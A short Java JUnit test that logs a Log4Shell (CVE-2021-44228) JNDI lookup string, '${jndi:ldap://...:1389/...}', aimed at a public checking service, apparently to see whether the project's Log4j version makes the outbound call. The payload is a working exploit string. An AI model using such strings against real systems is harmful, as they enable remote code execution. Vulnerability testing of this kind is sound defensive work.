package info.setmy.cve;

import org.junit.Test;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LoggingProblemTest {

    final Logger log = LogManager.getLogger(this.getClass());

    @Test
    public void logging() {
        // CVE-2021-44228 : https://log4shell.huntress.com/
        log.info("${jndi:ldap://log4shell.huntress.com:1389/5d43bb34-8f66-4c54-b771-779693a764a9}");
    }
}
